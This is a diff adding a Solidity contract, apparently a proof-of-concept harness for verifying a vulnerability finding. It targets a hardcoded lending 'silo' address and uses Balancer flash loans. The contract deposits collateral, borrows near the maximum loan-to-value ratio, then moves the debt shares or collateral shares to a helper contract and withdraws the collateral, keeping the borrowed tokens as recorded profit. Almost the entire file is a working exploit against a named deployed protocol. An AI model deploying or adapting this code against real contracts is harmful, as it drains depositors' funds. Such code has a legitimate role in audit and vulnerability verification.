@@ -1,0 +1,771 @@
+// SPDX-License-Identifier: BUSL-1.1
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function decimals() external view returns (uint8);
+}
+
+interface IShareTokenLike is IERC20Like {}
+
+interface INotificationReceiverLike {
+    function onAfterTransfer(address token, address from, address to, uint256 amount) external;
+    function notificationReceiverPing() external pure returns (bytes4);
+}
+
+interface IPriceProvidersRepositoryLike {
+    function getPrice(address asset) external view returns (uint256 price);
+}
+
+interface ISiloRepositoryLike {
+    function getMaximumLTV(address silo, address asset) external view returns (uint256);
+    function priceProvidersRepository() external view returns (IPriceProvidersRepositoryLike);
+    function entryFee() external view returns (uint256);
+}
+
+interface ISiloLike {
+    struct AssetStorage {
+        IShareTokenLike collateralToken;
+        IShareTokenLike collateralOnlyToken;
+        IShareTokenLike debtToken;
+        uint256 totalDeposits;
+        uint256 collateralOnlyDeposits;
+        uint256 totalBorrowAmount;
+    }
+
+    function initAssetsTokens() external;
+    function syncBridgeAssets() external;
+    function siloRepository() external view returns (ISiloRepositoryLike);
+    function getAssets() external view returns (address[] memory assets);
+    function assetStorage(address asset) external view returns (AssetStorage memory);
+    function depositPossible(address asset, address depositor) external view returns (bool);
+    function borrowPossible(address asset, address borrower) external view returns (bool);
+    function liquidity(address asset) external view returns (uint256);
+    function deposit(address asset, uint256 amount, bool collateralOnly)
+        external
+        returns (uint256 collateralAmount, uint256 collateralShare);
+    function borrow(address asset, uint256 amount) external returns (uint256 debtAmount, uint256 debtShare);
+    function withdraw(address asset, uint256 amount, bool collateralOnly)
+        external
+        returns (uint256 withdrawnAmount, uint256 withdrawnShare);
+}
+
+interface IFlashLoanRecipient {
+    function receiveFlashLoan(
+        IERC20Like[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory userData
+    ) external;
+}
+
+interface IBalancerVaultLike {
+    function flashLoan(
+        IFlashLoanRecipient recipient,
+        IERC20Like[] memory tokens,
+        uint256[] memory amounts,
+        bytes memory userData
+    ) external;
+}
+
+contract PositionReceiver is INotificationReceiverLike {
+    address public immutable verifier;
+
+    constructor(address verifier_) {
+        verifier = verifier_;
+    }
+
+    modifier onlyVerifier() {
+        require(msg.sender == verifier, "only verifier");
+        _;
+    }
+
+    function notificationReceiverPing() external pure override returns (bytes4) {
+        return INotificationReceiverLike.notificationReceiverPing.selector;
+    }
+
+    function onAfterTransfer(address, address, address, uint256) external pure override {}
+
+    function shareBalance(address shareToken) external view returns (uint256) {
+        return IERC20Like(shareToken).balanceOf(address(this));
+    }
+
+    function executeWithdraw(address silo, address asset) external onlyVerifier returns (uint256 withdrawnAmount) {
+        (withdrawnAmount,) = ISiloLike(silo).withdraw(asset, type(uint256).max, false);
+        _safeTransfer(asset, verifier, IERC20Like(asset).balanceOf(address(this)));
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        if (amount == 0) return;
+
+        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "receiver transfer failed");
+    }
+}
+
+contract FlawVerifier is IFlashLoanRecipient {
+    address public constant TARGET_SILO = 0xcB3B879aB11F825885d5aDD8Bf3672596d35197C;
+    address public constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
+
+    uint256 internal constant ONE = 1e18;
+    uint256 internal constant BPS = 10_000;
+    uint256 internal constant BORROW_SAFETY_BPS = 9_000;
+    uint256 internal constant FLASH_RESERVE_BPS = 10;
+
+    error CollateralShareTransferFailed();
+    error CollateralWithdrawFailed();
+    error DebtShareTransferFailed();
+
+    enum Outcome {
+        Unset,
+        Profit,
+        Refuted,
+        Infeasible
+    }
+
+    enum RouteKind {
+        DebtShare,
+        CollateralShare
+    }
+
+    struct FlashContext {
+        address collateralAsset;
+        address borrowAsset;
+        uint256 flashAmount;
+        uint256 depositAmount;
+        uint256 initialBorrowBalance;
+        RouteKind routeKind;
+        bool active;
+    }
+
+    PositionReceiver public immutable receiver;
+
+    address internal _profitToken;
+    uint256 internal _profitAmount;
+
+    Outcome public outcome;
+    bytes32 public lastFailureTag;
+    address public chosenCollateralAsset;
+    address public chosenBorrowAsset;
+
+    bool internal _sawViablePair;
+    bool internal _sawTransferStageFailure;
+    FlashContext internal _flashContext;
+
+    modifier onlySelf() {
+        require(msg.sender == address(this), "only self");
+        _;
+    }
+
+    constructor() {
+        receiver = new PositionReceiver(address(this));
+    }
+
+    function executeOnOpportunity() external {
+        if (_profitAmount != 0) return;
+
+        _bestEffortInitAssets();
+
+        // The trace already shows the collateral-share branch reverting during share transfer.
+        // Preserve the finding's root cause by prioritizing the alternative disclosed branch:
+        // move debt shares away, then withdraw still-held collateral from the now debt-light account.
+        if (_attemptUsingOwnedBalances(RouteKind.DebtShare)) return;
+        if (_attemptUsingFlashLiquidity(RouteKind.DebtShare)) return;
+
+        // Keep the original collateral-share branch as a fallback, because the finding states either
+        // collateral shares or debt shares can separate ownership if the deployed tokens allow transfer.
+        if (_attemptUsingOwnedBalances(RouteKind.CollateralShare)) return;
+        if (_attemptUsingFlashLiquidity(RouteKind.CollateralShare)) return;
+
+        outcome = _sawTransferStageFailure ? Outcome.Refuted : Outcome.Infeasible;
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function attemptDirectDebtShareRoute(address collateralAsset, address borrowAsset, uint256 depositAmount)
+        external
+        onlySelf
+        returns (uint256 realizedProfit)
+    {
+        uint256 initialBorrowBalance = IERC20Like(borrowAsset).balanceOf(address(this));
+
+        _forceApprove(collateralAsset, TARGET_SILO, depositAmount);
+        (, uint256 collateralShare) = ISiloLike(TARGET_SILO).deposit(collateralAsset, depositAmount, false);
+        require(collateralShare != 0, "zero collateral share");
+
+        uint256 borrowAmount = _quoteBorrowAmount(collateralAsset, borrowAsset, depositAmount);
+        require(borrowAmount != 0, "zero borrow");
+
+        (, uint256 debtShare) = ISiloLike(TARGET_SILO).borrow(borrowAsset, borrowAmount);
+        require(debtShare != 0, "zero debt share");
+
+        // Path stages 2-4 through the alternative branch listed in the finding:
+        // the borrower moves debt shares to a second account, then withdraws its still-held collateral.
+        _transferDebtSharesToReceiver(borrowAsset, debtShare);
+        ISiloLike(TARGET_SILO).withdraw(collateralAsset, type(uint256).max, false);
+
+        realizedProfit = IERC20Like(borrowAsset).balanceOf(address(this)) - initialBorrowBalance;
+        require(realizedProfit != 0, "no profit");
+
+        _recordProfit(collateralAsset, borrowAsset, realizedProfit);
+    }
+
+    function attemptFlashDebtShareRoute(address collateralAsset, address borrowAsset, uint256 flashAmount)
+        external
+        onlySelf
+        returns (bool)
+    {
+        _startFlashRoute(collateralAsset, borrowAsset, flashAmount, RouteKind.DebtShare);
+        return _profitAmount != 0;
+    }
+
+    function attemptDirectCollateralShareRoute(address collateralAsset, address borrowAsset, uint256 depositAmount)
+        external
+        onlySelf
+        returns (uint256 realizedProfit)
+    {
+        uint256 initialBorrowBalance = IERC20Like(borrowAsset).balanceOf(address(this));
+
+        _forceApprove(collateralAsset, TARGET_SILO, depositAmount);
+        (, uint256 collateralShare) = ISiloLike(TARGET_SILO).deposit(collateralAsset, depositAmount, false);
+        require(collateralShare != 0, "zero collateral share");
+
+        uint256 borrowAmount = _quoteBorrowAmount(collateralAsset, borrowAsset, depositAmount);
+        require(borrowAmount != 0, "zero borrow");
+        ISiloLike(TARGET_SILO).borrow(borrowAsset, borrowAmount);
+
+        _transferCollateralSharesToReceiver(collateralAsset, collateralShare);
+        _withdrawDetachedCollateral(collateralAsset);
+
+        realizedProfit = IERC20Like(borrowAsset).balanceOf(address(this)) - initialBorrowBalance;
+        require(realizedProfit != 0, "no profit");
+
+        _recordProfit(collateralAsset, borrowAsset, realizedProfit);
+    }
+
+    function attemptFlashCollateralShareRoute(address collateralAsset, address borrowAsset, uint256 flashAmount)
+        external
+        onlySelf
+        returns (bool)
+    {
+        _startFlashRoute(collateralAsset, borrowAsset, flashAmount, RouteKind.CollateralShare);
+        return _profitAmount != 0;
+    }
+
+    function receiveFlashLoan(
+        IERC20Like[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory
+    ) external override {
+        FlashContext memory context = _flashContext;
+
+        require(msg.sender == BALANCER_VAULT, "not vault");
+        require(context.active, "inactive flash");
+        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad flash arrays");
+        require(address(tokens[0]) == context.collateralAsset, "bad collateral");
+        require(amounts[0] == context.flashAmount, "bad amount");
+
+        if (context.routeKind == RouteKind.DebtShare) {
+            _executeFlashDebtShareRoute(context, feeAmounts[0]);
+        } else {
+            _executeFlashCollateralShareRoute(context, feeAmounts[0]);
+        }
+
+        delete _flashContext;
+    }
+
+    function _attemptUsingOwnedBalances(RouteKind routeKind) internal returns (bool) {
+        address[] memory assets = ISiloLike(TARGET_SILO).getAssets();
+        bool hadOwnedCollateral;
+
+        for (uint256 i = 0; i < assets.length; i++) {
+            address collateralAsset = assets[i];
+            if (!_isActiveUsableAsset(collateralAsset)) continue;
+
+            uint256 heldBalance = IERC20Like(collateralAsset).balanceOf(address(this));
+            if (heldBalance == 0) continue;
+            hadOwnedCollateral = true;
+
+            uint256[5] memory candidateDeposits = _ownedCandidateAmounts(collateralAsset, heldBalance);
+            for (uint256 d = 0; d < candidateDeposits.length; d++) {
+                uint256 depositAmount = candidateDeposits[d];
+                if (depositAmount == 0) continue;
+
+                for (uint256 j = 0; j < assets.length; j++) {
+                    address borrowAsset = assets[j];
+                    if (!_isViablePair(collateralAsset, borrowAsset, depositAmount)) continue;
+
+                    _sawViablePair = true;
+
+                    if (routeKind == RouteKind.DebtShare) {
+                        try this.attemptDirectDebtShareRoute(collateralAsset, borrowAsset, depositAmount) returns (
+                            uint256 realizedProfit
+                        ) {
+                            if (realizedProfit != 0) return true;
+                        } catch (bytes memory reason) {
+                            _recordFailure(reason, "DIRECT_DEBT_SHARE_ROUTE_FAILED");
+                        }
+                    } else {
+                        try this.attemptDirectCollateralShareRoute(collateralAsset, borrowAsset, depositAmount) returns (
+                            uint256 realizedProfit
+                        ) {
+                            if (realizedProfit != 0) return true;
+                        } catch (bytes memory reason) {
+                            _recordFailure(reason, "DIRECT_COLLATERAL_SHARE_ROUTE_FAILED");
+                        }
+                    }
+                }
+            }
+        }
+
+        if (!hadOwnedCollateral && lastFailureTag == bytes32(0)) {
+            lastFailureTag = keccak256("NO_EXISTING_VERIFIER_BALANCE");
+        } else if (!_sawViablePair && lastFailureTag == bytes32(0)) {
+            lastFailureTag = keccak256("OWNED_BALANCE_NO_VIABLE_PAIR");
+        }
+
+        return false;
+    }
+
+    function _attemptUsingFlashLiquidity(RouteKind routeKind) internal returns (bool) {
+        address[] memory assets = ISiloLike(TARGET_SILO).getAssets();
+        bool hadFlashSource;
+
+        for (uint256 i = 0; i < assets.length; i++) {
+            address collateralAsset = assets[i];
+            if (!_isActiveUsableAsset(collateralAsset)) continue;
+
+            uint256 vaultBalance = IERC20Like(collateralAsset).balanceOf(BALANCER_VAULT);
+            if (vaultBalance == 0) continue;
+            hadFlashSource = true;
+
+            uint256[6] memory candidateFlashAmounts = _flashCandidateAmounts(collateralAsset, vaultBalance);
+            for (uint256 a = 0; a < candidateFlashAmounts.length; a++) {
+                uint256 flashAmount = candidateFlashAmounts[a];
+                if (flashAmount <= 1) continue;
+
+                uint256 depositAmount = _depositAmountFromFlashAmount(flashAmount);
+                if (depositAmount == 0) continue;
+
+                for (uint256 j = 0; j < assets.length; j++) {
+                    address borrowAsset = assets[j];
+                    if (!_isViablePair(collateralAsset, borrowAsset, depositAmount)) continue;
+
+                    _sawViablePair = true;
+
+                    if (routeKind == RouteKind.DebtShare) {
+                        try this.attemptFlashDebtShareRoute(collateralAsset, borrowAsset, flashAmount) returns (
+                            bool success
+                        ) {
+                            if (success) return true;
+                        } catch (bytes memory reason) {
+                            _recordFailure(reason, "FLASH_DEBT_SHARE_ROUTE_FAILED");
+                        }
+                    } else {
+                        try this.attemptFlashCollateralShareRoute(collateralAsset, borrowAsset, flashAmount) returns (
+                            bool success
+                        ) {
+                            if (success) return true;
+                        } catch (bytes memory reason) {
+                            _recordFailure(reason, "FLASH_COLLATERAL_SHARE_ROUTE_FAILED");
+                        }
+                    }
+                }
+            }
+        }
+
+        if (!hadFlashSource && lastFailureTag == bytes32(0)) {
+            lastFailureTag = keccak256("NO_BALANCER_FLASH_SOURCE");
+        } else if (!_sawViablePair && lastFailureTag == bytes32(0)) {
+            lastFailureTag = keccak256("FLASH_LIQUIDITY_NO_VIABLE_PAIR");
+        }
+
+        return false;
+    }
+
+    function _startFlashRoute(address collateralAsset, address borrowAsset, uint256 flashAmount, RouteKind routeKind)
+        internal
+    {
+        uint256 depositAmount = _depositAmountFromFlashAmount(flashAmount);
+        require(depositAmount != 0, "zero deposit");
+
+        _flashContext = FlashContext({
+            collateralAsset: collateralAsset,
+            borrowAsset: borrowAsset,
+            flashAmount: flashAmount,
+            depositAmount: depositAmount,
+            initialBorrowBalance: IERC20Like(borrowAsset).balanceOf(address(this)),
+            routeKind: routeKind,
+            active: true
+        });
+
+        IERC20Like[] memory tokens = new IERC20Like[](1);
+        uint256[] memory amounts = new uint256[](1);
+        tokens[0] = IERC20Like(collateralAsset);
+        amounts[0] = flashAmount;
+
+        // The public flash liquidity only supplies temporary capital. The exploit causality remains the same:
+        // deposit -> borrow -> transfer shares between accounts -> withdraw under the new attribution.
+        IBalancerVaultLike(BALANCER_VAULT).flashLoan(this, tokens, amounts, bytes(""));
+        require(!_flashContext.active, "flash not cleared");
+    }
+
+    function _executeFlashDebtShareRoute(FlashContext memory context, uint256 feeAmount) internal {
+        _forceApprove(context.collateralAsset, TARGET_SILO, context.depositAmount);
+        (, uint256 collateralShare) =
+            ISiloLike(TARGET_SILO).deposit(context.collateralAsset, context.depositAmount, false);
+        require(collateralShare != 0, "zero collateral share");
+
+        uint256 borrowAmount = _quoteBorrowAmount(context.collateralAsset, context.borrowAsset, context.depositAmount);
+        require(borrowAmount != 0, "zero borrow");
+
+        (, uint256 debtShare) = ISiloLike(TARGET_SILO).borrow(context.borrowAsset, borrowAmount);
+        require(debtShare != 0, "zero debt share");
+
+        _transferDebtSharesToReceiver(context.borrowAsset, debtShare);
+        ISiloLike(TARGET_SILO).withdraw(context.collateralAsset, type(uint256).max, false);
+
+        uint256 repayAmount = context.flashAmount + feeAmount;
+        require(
+            IERC20Like(context.collateralAsset).balanceOf(address(this)) >= repayAmount, "flash repayment shortfall"
+        );
+        _safeTransfer(context.collateralAsset, BALANCER_VAULT, repayAmount);
+
+        uint256 realizedProfit = IERC20Like(context.borrowAsset).balanceOf(address(this)) - context.initialBorrowBalance;
+        require(realizedProfit != 0, "no profit");
+
+        _recordProfit(context.collateralAsset, context.borrowAsset, realizedProfit);
+    }
+
+    function _executeFlashCollateralShareRoute(FlashContext memory context, uint256 feeAmount) internal {
+        _forceApprove(context.collateralAsset, TARGET_SILO, context.depositAmount);
+        (, uint256 collateralShare) =
+            ISiloLike(TARGET_SILO).deposit(context.collateralAsset, context.depositAmount, false);
+        require(collateralShare != 0, "zero collateral share");
+
+        uint256 borrowAmount = _quoteBorrowAmount(context.collateralAsset, context.borrowAsset, context.depositAmount);
+        require(borrowAmount != 0, "zero borrow");
+        ISiloLike(TARGET_SILO).borrow(context.borrowAsset, borrowAmount);
+
+        _transferCollateralSharesToReceiver(context.collateralAsset, collateralShare);
+        _withdrawDetachedCollateral(context.collateralAsset);
+
+        uint256 repayAmount = context.flashAmount + feeAmount;
+        require(
+            IERC20Like(context.collateralAsset).balanceOf(address(this)) >= repayAmount, "flash repayment shortfall"
+        );
+        _safeTransfer(context.collateralAsset, BALANCER_VAULT, repayAmount);
+
+        uint256 realizedProfit = IERC20Like(context.borrowAsset).balanceOf(address(this)) - context.initialBorrowBalance;
+        require(realizedProfit != 0, "no profit");
+
+        _recordProfit(context.collateralAsset, context.borrowAsset, realizedProfit);
+    }
+
+    function _transferDebtSharesToReceiver(address debtAsset, uint256 debtShare) internal {
+        address debtShareToken = address(ISiloLike(TARGET_SILO).assetStorage(debtAsset).debtToken);
+        if (!_safeTransferERC20(debtShareToken, address(receiver), debtShare)) {
+            revert DebtShareTransferFailed();
+        }
+        if (receiver.shareBalance(debtShareToken) == 0) {
+            revert DebtShareTransferFailed();
+        }
+    }
+
+    function _transferCollateralSharesToReceiver(address collateralAsset, uint256 collateralShare) internal {
+        address collateralShareToken = address(ISiloLike(TARGET_SILO).assetStorage(collateralAsset).collateralToken);
+        if (!_safeTransferERC20(collateralShareToken, address(receiver), collateralShare)) {
+            revert CollateralShareTransferFailed();
+        }
+        if (receiver.shareBalance(collateralShareToken) == 0) {
+            revert CollateralShareTransferFailed();
+        }
+    }
+
+    function _withdrawDetachedCollateral(address collateralAsset) internal {
+        try receiver.executeWithdraw(TARGET_SILO, collateralAsset) returns (uint256 withdrawnAmount) {
+            withdrawnAmount;
+        } catch {
+            revert CollateralWithdrawFailed();
+        }
+    }
+
+    function _isViablePair(address collateralAsset, address borrowAsset, uint256 depositAmount)
+        internal
+        view
+        returns (bool)
+    {
+        if (borrowAsset == collateralAsset) return false;
+        if (depositAmount == 0) return false;
+        if (!_isActiveUsableAsset(borrowAsset)) return false;
+
+        if (
+            !_staticBool(
+                TARGET_SILO,
+                abi.encodeWithSelector(ISiloLike.depositPossible.selector, collateralAsset, address(this))
+            )
+        ) {
+            return false;
+        }
+
+        if (
+            !_staticBool(
+                TARGET_SILO,
+                abi.encodeWithSelector(ISiloLike.borrowPossible.selector, borrowAsset, address(this))
+            )
+        ) {
+            return false;
+        }
+
+        if (_quoteBorrowAmount(collateralAsset, borrowAsset, depositAmount) == 0) return false;
+        return true;
+    }
+
+    function _isActiveUsableAsset(address asset) internal view returns (bool) {
+        if (asset == address(0)) return false;
+
+        ISiloLike.AssetStorage memory state = ISiloLike(TARGET_SILO).assetStorage(asset);
+        return address(state.collateralToken) != address(0) && address(state.debtToken) != address(0);
+    }
+
+    function _quoteBorrowAmount(address collateralAsset, address borrowAsset, uint256 collateralAmount)
+        internal
+        view
+        returns (uint256)
+    {
+        if (collateralAmount == 0) return 0;
+
+        uint256 maxLtv = _maximumLtv(collateralAsset);
+        if (maxLtv == 0) return 0;
+
+        uint256 collateralValue = _valueOf(collateralAsset, collateralAmount);
+        if (collateralValue == 0) return 0;
+
+        uint256 debtValue = collateralValue * maxLtv / ONE;
+        debtValue = debtValue * BORROW_SAFETY_BPS / BPS;
+        if (debtValue == 0) return 0;
+
+        uint256 entryFee = _entryFee();
+        if (entryFee == type(uint256).max) return 0;
+        debtValue = debtValue * ONE / (ONE + entryFee);
+        if (debtValue == 0) return 0;
+
+        uint256 borrowPrice = _assetPrice(borrowAsset);
+        if (borrowPrice == 0) return 0;
+
+        uint256 borrowDecimals = _assetDecimals(borrowAsset);
+        if (borrowDecimals == type(uint256).max) return 0;
+
+        uint256 scale = 10 ** borrowDecimals;
+        uint256 borrowAmount = debtValue * scale / borrowPrice;
+        if (borrowAmount == 0) return 0;
+
+        uint256 availableLiquidity = _availableLiquidity(borrowAsset);
+        if (availableLiquidity == 0) return 0;
+
+        if (borrowAmount > availableLiquidity) {
+            borrowAmount = availableLiquidity * BORROW_SAFETY_BPS / BPS;
+        }
+
+        return borrowAmount;
+    }
+
+    function _valueOf(address asset, uint256 amount) internal view returns (uint256) {
+        if (amount == 0) return 0;
+
+        uint256 price = _assetPrice(asset);
+        if (price == 0) return 0;
+
+        uint256 assetDecimals = _assetDecimals(asset);
+        if (assetDecimals == type(uint256).max) return 0;
+
+        return amount * price / (10 ** assetDecimals);
+    }
+
+    function _amountForValue(address asset, uint256 targetValue) internal view returns (uint256) {
+        if (targetValue == 0) return 0;
+
+        uint256 price = _assetPrice(asset);
+        if (price == 0) return 0;
+
+        uint256 assetDecimals = _assetDecimals(asset);
+        if (assetDecimals == type(uint256).max) return 0;
+
+        uint256 amount = targetValue * (10 ** assetDecimals) / price;
+        return amount == 0 ? 1 : amount;
+    }
+
+    function _ownedCandidateAmounts(address asset, uint256 balance) internal view returns (uint256[5] memory amounts) {
+        amounts[0] = _min(balance, _amountForValue(asset, 10 ether));
+        amounts[1] = _min(balance, _amountForValue(asset, 100 ether));
+        amounts[2] = _min(balance, _amountForValue(asset, 1_000 ether));
+        amounts[3] = balance / 2;
+        amounts[4] = balance;
+    }
+
+    function _flashCandidateAmounts(address asset, uint256 vaultBalance)
+        internal
+        view
+        returns (uint256[6] memory amounts)
+    {
+        uint256 cap = vaultBalance / 1_000;
+        if (cap == 0) return amounts;
+
+        amounts[0] = _min(cap, _amountForValue(asset, 10 ether));
+        amounts[1] = _min(cap, _amountForValue(asset, 100 ether));
+        amounts[2] = _min(cap, _amountForValue(asset, 1_000 ether));
+        amounts[3] = _min(cap, _amountForValue(asset, 10_000 ether));
+        amounts[4] = cap / 2;
+        amounts[5] = cap;
+    }
+
+    function _depositAmountFromFlashAmount(uint256 flashAmount) internal pure returns (uint256) {
+        uint256 reserveAmount = flashAmount * FLASH_RESERVE_BPS / BPS;
+        if (reserveAmount == 0 && flashAmount > 1) reserveAmount = 1;
+        return flashAmount - reserveAmount;
+    }
+
+    function _bestEffortInitAssets() internal {
+        try ISiloLike(TARGET_SILO).initAssetsTokens() {} catch {}
+        try ISiloLike(TARGET_SILO).syncBridgeAssets() {} catch {}
+    }
+
+    function _maximumLtv(address collateralAsset) internal view returns (uint256 maxLtv) {
+        (bool ok, uint256 value) = _staticUint(
+            _repository(),
+            abi.encodeWithSelector(ISiloRepositoryLike.getMaximumLTV.selector, TARGET_SILO, collateralAsset)
+        );
+        if (!ok) return 0;
+        return value;
+    }
+
+    function _entryFee() internal view returns (uint256 fee) {
+        (bool ok, uint256 value) =
+            _staticUint(_repository(), abi.encodeWithSelector(ISiloRepositoryLike.entryFee.selector));
+        if (!ok) return type(uint256).max;
+        return value;
+    }
+
+    function _assetPrice(address asset) internal view returns (uint256 price) {
+        address priceRepo = _priceRepository();
+        if (priceRepo == address(0)) return 0;
+
+        (bool ok, uint256 value) =
+            _staticUint(priceRepo, abi.encodeWithSelector(IPriceProvidersRepositoryLike.getPrice.selector, asset));
+        if (!ok) return 0;
+        return value;
+    }
+
+    function _assetDecimals(address asset) internal view returns (uint256 decimalsValue) {
+        (bool ok, uint256 value) = _staticUint(asset, abi.encodeWithSelector(IERC20Like.decimals.selector));
+        if (!ok) return type(uint256).max;
+        return value;
+    }
+
+    function _availableLiquidity(address asset) internal view returns (uint256 liquidityValue) {
+        (bool ok, uint256 value) = _staticUint(TARGET_SILO, abi.encodeWithSelector(ISiloLike.liquidity.selector, asset));
+        if (!ok) return 0;
+        return value;
+    }
+
+    function _repository() internal view returns (address repository) {
+        (bool ok, address value) =
+            _staticAddress(TARGET_SILO, abi.encodeWithSelector(ISiloLike.siloRepository.selector));
+        if (!ok) return address(0);
+        return value;
+    }
+
+    function _priceRepository() internal view returns (address priceRepo) {
+        address repository = _repository();
+        if (repository == address(0)) return address(0);
+
+        (bool ok, address value) = _staticAddress(
+            repository, abi.encodeWithSelector(ISiloRepositoryLike.priceProvidersRepository.selector)
+        );
+        if (!ok) return address(0);
+        return value;
+    }
+
+    function _recordProfit(address collateralAsset, address borrowAsset, uint256 realizedProfit) internal {
+        chosenCollateralAsset = collateralAsset;
+        chosenBorrowAsset = borrowAsset;
+        _profitToken = borrowAsset;
+        _profitAmount = realizedProfit;
+        outcome = Outcome.Profit;
+    }
+
+    function _recordFailure(bytes memory reason, string memory fallbackTag) internal {
+        if (_isTransferStageFailure(reason)) {
+            _sawTransferStageFailure = true;
+        }
+
+        if (lastFailureTag == bytes32(0)) {
+            lastFailureTag = keccak256(bytes(fallbackTag));
+        }
+    }
+
+    function _isTransferStageFailure(bytes memory reason) internal pure returns (bool) {
+        if (reason.length < 4) return false;
+
+        bytes4 selector;
+        assembly {
+            selector := mload(add(reason, 0x20))
+        }
+
+        return selector == CollateralShareTransferFailed.selector || selector == DebtShareTransferFailed.selector
+            || selector == CollateralWithdrawFailed.selector;
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        _safeApprove(token, spender, 0);
+        _safeApprove(token, spender, amount);
+    }
+
+    function _safeApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        require(_safeTransferERC20(token, to, amount), "transfer failed");
+    }
+
+    function _safeTransferERC20(address token, address to, uint256 amount) internal returns (bool) {
+        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+        return ok && (data.length == 0 || abi.decode(data, (bool)));
+    }
+
+    function _staticBool(address target, bytes memory callData) internal view returns (bool value) {
+        (bool ok, bytes memory data) = target.staticcall(callData);
+        if (!ok || data.length < 32) return false;
+        value = abi.decode(data, (bool));
+    }
+
+    function _staticUint(address target, bytes memory callData) internal view returns (bool ok, uint256 value) {
+        bytes memory data;
+        (ok, data) = target.staticcall(callData);
+        if (!ok || data.length < 32) return (false, 0);
+        value = abi.decode(data, (uint256));
+    }
+
+    function _staticAddress(address target, bytes memory callData) internal view returns (bool ok, address value) {
+        bytes memory data;
+        (ok, data) = target.staticcall(callData);
+        if (!ok || data.length < 32) return (false, address(0));
+        value = abi.decode(data, (address));
+    }
+
+    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a < b ? a : b;
+    }
+}
